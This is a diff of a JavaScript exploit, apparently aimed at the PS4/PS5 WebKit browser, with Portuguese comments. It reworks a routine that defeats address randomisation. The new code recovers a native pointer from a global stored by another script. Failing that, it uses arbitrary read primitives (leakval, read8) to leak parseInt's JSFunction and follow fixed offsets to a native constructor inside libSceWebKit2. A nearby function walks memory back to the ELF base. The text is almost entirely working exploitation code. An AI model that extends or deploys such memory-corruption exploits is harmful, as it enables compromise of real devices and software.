@@ -303,44 +303,43 @@ async function tryProcMaps() {
     return null;
 }
 
-// --- pegar ponteiro confiável dentro do WebKit -------------------------------
-// --- pegar ponteiro confiável dentro do WebKit (Modificado para PS4) ---
+// --- pegar ponteiro confiável dentro do WebKit (Seguro via JSC) ---
 function getWebKitPointer(p) {
-    // Tenta usar o offset conhecido ou varrer opções seguras
-    const el = document.createElement('textarea');
-    const cell = p.leakval(el);
-    
-    // Offsets comuns para o objeto C++ em diferentes versões do WebKit (JSC)
-    const offsetsParaTestar = [0x20, 0x28, 0x30, 0x38];
-
-    
-    for (const offset of offsetsParaTestar) {
-        log(`[*] Testando offset 0x${offset.toString(16)}...`, 'log-dim');
-        const cppObj = p.read8(cell.add32(offset));
-        
-        // 1. Validação básica: O ponteiro parece ser de user-space válido?
-        // No PS4/PS5, ponteiros válidos geralmente têm hi > 0 e hi <= 0xFFFF
-        if (cppObj.hi > 0 && cppObj.hi <= 0xFFFF && (cppObj.low & 3) === 0) {
-            
-            // 2. Tenta ler a vtable apenas se o ponteiro passar no teste de sanidade
-            // (Isso reduz drasticamente a chance de ler lixo e causar segfault)
-            try {
-                const vtable = p.read8(cppObj);
-                
-                if (vtable.hi > 0 && vtable.hi <= 0xFFFF) {
-                    const entry = p.read8(vtable);
-                    log(`[+] vtable[0] encontrada no offset 0x${offset.toString(16)}: 0x${entry.toString()}`, 'log-addr');
-                    return entry;
-                }
-            } catch (e) {
-                log(`[-] Falha ao desreferenciar cppObj no offset 0x${offset.toString(16)}`, 'log-warn');
-            }
-        }
+    // 1. Tenta pegar o ponteiro salvo silenciosamente pelo core.js
+    const ctor = globalThis.__ps5NativeCtor;
+    if (typeof ctor === 'number' && ctor > 0x100000000) {
+        const hi = Math.floor(ctor / 0x100000000);
+        const lo = ctor - hi * 0x100000000;
+        const ptr = new int64(lo >>> 0, hi >>> 0);
+        log('[+] __ps5NativeCtor recuperado: 0x' + ptr.toString(), 'log-addr');
+        setCard('card-ctor', '0x' + ptr.toString());
+        return ptr;
     }
-    
-    log('[-] Nenhum ponteiro nativo válido encontrado no textarea.', 'log-error');
+
+    // 2. Fallback JSC: Usar a estrutura do parseInt em vez de DOM
+    log('[*] DOM evitado. Usando fallback seguro via parseInt...', 'log-dim');
+    try {
+        // Vaza o endereço do objeto JSFunction
+        const jsFunc = p.leakval(parseInt);
+        
+        // Offset 0x18 em uma JSFunction aponta para o Executable
+        const executable = p.read8(jsFunc.add32(0x18)); 
+        
+        // Offset 0x30 no NativeExecutable aponta para o construtor nativo na libSceWebKit2
+        const nativeCtor = p.read8(executable.add32(0x30));
+        
+        if (nativeCtor.hi > 0 && nativeCtor.hi <= 0xFFFF) {
+            log('[+] nativeCtor encontrado: 0x' + nativeCtor.toString(), 'log-addr');
+            setCard('card-ctor', '0x' + nativeCtor.toString());
+            return nativeCtor;
+        }
+    } catch (e) {
+        log('[-] Fallback do parseInt falhou.', 'log-error');
+    }
+
     return null;
 }
+
 
 // --- ELF scan: anda para trás até achar \x7fELF -----------------------------
 function findElfBase(p, ptrInside, label) {
